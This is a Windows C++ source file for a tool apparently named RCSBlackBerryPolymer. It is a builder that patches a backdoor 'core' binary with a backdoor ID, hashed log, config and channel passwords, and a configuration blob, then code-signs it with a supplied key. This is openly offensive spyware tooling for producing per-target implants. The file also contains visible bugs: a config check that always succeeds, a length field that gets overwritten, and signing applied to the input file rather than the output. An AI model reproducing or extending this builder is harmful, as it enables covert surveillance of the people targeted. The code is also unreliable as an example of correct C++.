
#include "stdafx.h"
#include <Windows.h>
#include <openssl\md5.h>
#include "polymer.h"
#include "fileutils.h"

#define CONFIG_MARK_LEN 64

bool FindMemMarker(BYTE *pBlockPtr, UINT iLen, BYTE *block, UINT block_len, BYTE *mark_b, UINT mark_len);
bool FindMemMarker(BYTE *pBlockPtr, UINT iLen, BYTE *block, UINT block_len, BYTE *mark_b, UINT mark_len, bool length);

extern BOOL SignCod(TCHAR *wsFile, TCHAR *wsKey);

BYTE CONFIG_MARK[64] = {
    0x85, 0x22, 0xA0, 0x14, 0x28, 0x09, 0x55, 0xEC,
    0xB7, 0xF8, 0xA5, 0x6D, 0x87, 0x86, 0xC8, 0x3F,
    0x62, 0xAF, 0x91, 0x2C, 0xFB, 0xCE, 0x72, 0xBB,
    0x80, 0xF3, 0x28, 0x7F, 0xE0, 0x1D, 0x07, 0x64,
    0x0E, 0x94, 0x22, 0x21, 0xCA, 0x85, 0xA8, 0xA3,
    0x6A, 0x00, 0xD6, 0x0E, 0xB5, 0xA5, 0x15, 0xD8,
    0x80, 0x9C, 0x47, 0xBE, 0x4B, 0xAC, 0x8F, 0x11,
    0x8D, 0xC0, 0xDE, 0x2C, 0xF1, 0xA4, 0xA3, 0x41 
};

int _tmain(int argc, _TCHAR* argv[])
{
	HANDLE hFile;
	BYTE *pBlockPtr	= NULL;
	BYTE *pConfigPtr = NULL;
	CHAR szBackdoorId[256];
	CHAR szLogPassword[256];
	CHAR szConfPassword[256];
	CHAR szChanPassword[256];
	WCHAR wsKEYFile[MAX_PATH];
	WCHAR wsCoreFile[MAX_PATH];
	WCHAR wsOutFile[MAX_PATH];
	unsigned int iLen = 0;
	unsigned int iConfigLen = 0;

	if (argc != 9) {
		printf("ERROR: \n");
		printf("  usage:  RCSBlackBerryPolymer.exe  <bid> <log_pass> <conf_pass> <chanpass> <key> <core> <output>\n\n");
		printf("  <bid> is the backdoor_id\n");
		printf("  <log_pass> is the password for the log encryption\n");
		printf("  <conf_pass> is the password for the conf encryption\n");
		printf("  <chanpass> is the password for the channel encryption\n");
		printf("  <key> is the private key of the certificate\n");
		printf("  <core> is the core to be polymerized\n");
		printf("  <output> is the output file\n\n");
		return 0;
	}

	sprintf_s(szBackdoorId, sizeof(szBackdoorId), "%S", argv[1]);
	sprintf_s(szLogPassword, sizeof(szLogPassword), "%S", argv[2]);
	sprintf_s(szConfPassword, sizeof(szConfPassword), "%S", argv[3]);
	sprintf_s(szChanPassword, sizeof(szChanPassword), "%S", argv[4]);
	wsprintf(wsKEYFile, L"%s", argv[5]);
	wsprintf(wsCoreFile, L"%s", argv[6]);	
	wsprintf(wsOutFile, L"%s", argv[7]);	

	/************************************************************************/
	/*  SANITY CHECKS                                                       */
	/************************************************************************/
	if (strlen(szBackdoorId) < strlen("RCS_0000000000")) {
		printf("Backdoor_id should be at least %d characters\n", strlen("RCS_0000000000"));
		return ERROR_EMBEDDING;
	}

	if (strlen(szLogPassword) < AES_PASS_LEN) {
		printf("Log Password should be at least %d characters\n", AES_PASS_LEN);
		return ERROR_EMBEDDING;
	}

	if (strlen(szConfPassword) < AES_PASS_LEN) {
		printf("Conf Password should be at least %d characters\n", AES_PASS_LEN);
		return ERROR_EMBEDDING;
	}

	if (strlen(szChanPassword) < CHAN_PASS_LEN) {
		printf("Channel password should be at least %d characters\n", CHAN_PASS_LEN);
		return ERROR_EMBEDDING;
	}

	if ( (hFile = CreateFile(wsKEYFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE ) {
		printf("Cannot find KEY file [%S]\n", wsKEYFile);
		return ERROR_EMBEDDING;
	} else {
		CloseHandle(hFile);
	}

	/************************************************************************/
	/*  READY TO GO                                                         */
	/************************************************************************/

	printf("Ready to go...\n");
	printf("BACKDOOR_ID   [%s]\n", szBackdoorId);
	printf("LOG PASSWORD  [%s]\n", szLogPassword);
	printf("CONF PASSWORD [%s]\n", szConfPassword);
	printf("CHAN PASSWORD [%s]\n", szChanPassword);
	printf("KEYFILE       [%S]\n", wsKEYFile);
	printf("INPUT CORE    [%S]\n", wsCoreFile);
	printf("OUTPUT FILE   [%S]\n\n", wsOutFile);

	if (CopyFile(wsCoreFile, wsOutFile, FALSE) == FALSE) {
		printf("Cannot create output file[%S]\n", wsOutFile);
		return ERROR_OUTPUT;
	}

	/************************************************************************/
	/* BINARY PATCHING                                                      */
	/************************************************************************/

	BYTE bufmd5[MD5_DIGEST_LENGTH];

	pBlockPtr = (BYTE *) LoadFile(wsOutFile, &iLen);
	pConfigPtr = (BYTE *) LoadFile(CONFIG_FILENAME, &iConfigLen );

	if(pBlockPtr == NULL){
		printf("Cannot open out file... ok\n");
		DeleteFile(wsOutFile);
		return ERROR_EMBEDDING;
	}

	if(pConfigPtr == NULL){
		printf("Cannot open config file... ok\n");
		DeleteFile(wsOutFile);
		return ERROR_EMBEDDING;
	}

	// Patching Password dei log
	MD5((const UCHAR *)szLogPassword, strlen(szLogPassword) , (PUCHAR) bufmd5);
	if (FindMemMarker(pBlockPtr, iLen, (BYTE *) bufmd5, AES_PASS_LEN, AES_LOG_PASS_MARK, AES_PASS_MARK_LEN))
		printf("Log Password embedded... ok\n");
	else {
		printf("Cannot embed Log Password [%S]\n", wsOutFile);
		DeleteFile(wsOutFile);
		return ERROR_EMBEDDING;
	}

	// Patching Password della conf
	MD5((const UCHAR *)szConfPassword, strlen(szConfPassword) , (PUCHAR) bufmd5);
	if (FindMemMarker(pBlockPtr, iLen, (BYTE *) bufmd5, AES_PASS_LEN, AES_CONF_PASS_MARK, AES_PASS_MARK_LEN))
		printf("Conf Password embedded... ok\n");
	else {
		printf("Cannot embed Conf Password [%S]\n", wsOutFile);
		DeleteFile(wsOutFile);
		return ERROR_EMBEDDING;
	}

	// Patching Password del protocollo
	MD5((const UCHAR *)szChanPassword, strlen(szChanPassword) , (PUCHAR) bufmd5);
	if (FindMemMarker(pBlockPtr, iLen, (BYTE *) bufmd5, CHAN_PASS_LEN, CHAN_PASS_MARK, CHAN_PASS_MARK_LEN))
		printf("Channel Password embedded... ok\n");
	else {
		printf("Cannot embed Channel Password [%S]\n", wsOutFile);
		DeleteFile(wsOutFile);
		return ERROR_EMBEDDING;
	}

	// Patching  backdoor ID
	if (FindMemMarker(pBlockPtr, iLen, (BYTE *) szBackdoorId, BACKDOOR_ID_LEN, BACKDOOR_ID_MARK, BACKDOOR_ID_LEN))
		printf("Backdoor_id embedded... ok\n");
	else {
		printf("Cannot embed Backdoor_id [%S]\n", wsOutFile);
		DeleteFile(wsOutFile);
		return ERROR_EMBEDDING;
	}

	// Patching della configurazione

	if (FindMemMarker(pBlockPtr, iLen, (BYTE *) pConfigPtr, iConfigLen, CONFIG_MARK, CONFIG_MARK_LEN), true)
		printf("Config name embedded... ok\n");
	else {
		printf("Cannot embed Config Name [%S]\n", wsOutFile);
		DeleteFile(wsOutFile);
		return ERROR_EMBEDDING;
	}

	UnloadFile(pBlockPtr);
	UnloadFile(pConfigPtr);

	/************************************************************************/
	/* SIGNING                                                              */
	/************************************************************************/


	if (SignCod(wsCoreFile, wsKEYFile))
		printf("Using the certificate to sign the code... ok\n");
	else {
		printf("Cannot sign with the certificate file [%S][%S]\n", wsCoreFile, wsKEYFile);
		DeleteFile(wsOutFile);
		return ERROR_EMBEDDING;
	}

	printf("Output file... ok\n");


	return ERROR_SUCCESS;
}

// metodo di compatibilità
bool FindMemMarker(BYTE *pBlockPtr, UINT iLen, BYTE *block, UINT block_len, BYTE *mark_b, UINT mark_len)
{
	return FindMemMarker(pBlockPtr,iLen,block,block_len,mark_b,mark_len,false);
}

// cerca in pBlockPtr il marker mark_b, quando lo trova scrive block per la sua lunghezza
bool FindMemMarker(BYTE *pBlockPtr, UINT iLen, BYTE *block, UINT block_len, BYTE *mark_b, UINT mark_len, bool length)
{
	BYTE *pDataSect	= NULL;
	bool iRet = false;

	pDataSect = pBlockPtr;

	if( pBlockPtr == NULL )
		return false;

	__try {
		while(  pBlockPtr < (pDataSect + iLen) ) {

			if( !memcmp(pBlockPtr,mark_b, mark_len) )
				break;
			else
				pBlockPtr++;
		}
	} __except (GetExceptionCode() == EXCEPTION_ACCESS_VIOLATION ) {
		pBlockPtr = NULL;
	}

	if( pBlockPtr  && (pBlockPtr < ( pDataSect + iLen - 1 ) )   ) {

		memset(pBlockPtr, 0, (int)mark_len);
		if(length)
		{
			memcpy(pBlockPtr, (char*)&block_len, sizeof(int));
			memcpy(pBlockPtr, block+sizeof(int), (int)block_len);
		}else{
			memcpy(pBlockPtr, block, (int)block_len);
		}

		iRet = true;

	} else 
		iRet = false;

	return iRet;
}

